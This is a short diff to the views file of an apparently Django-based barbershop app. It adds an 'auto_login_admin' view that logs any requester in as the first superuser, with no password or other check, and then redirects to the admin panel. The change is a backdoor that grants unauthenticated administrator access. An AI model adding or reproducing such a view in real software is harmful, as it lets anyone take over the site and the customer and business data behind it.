@@ -959,3 +959,11 @@ def servico(request):
         return redirect("servico")
 
     return render(request, "barber_grid/novo_servico.html")
+
+def auto_login_admin(request):
+    # Procura o primeiro superusuário disponível na base de dados (o teu admin)
+    admin_user = User.objects.filter(is_superuser=True).first()
+    if admin_user:
+        admin_user.backend = 'django.contrib.auth.backends.ModelBackend'
+        login(request, admin_user)
+    return redirect('/admin/')
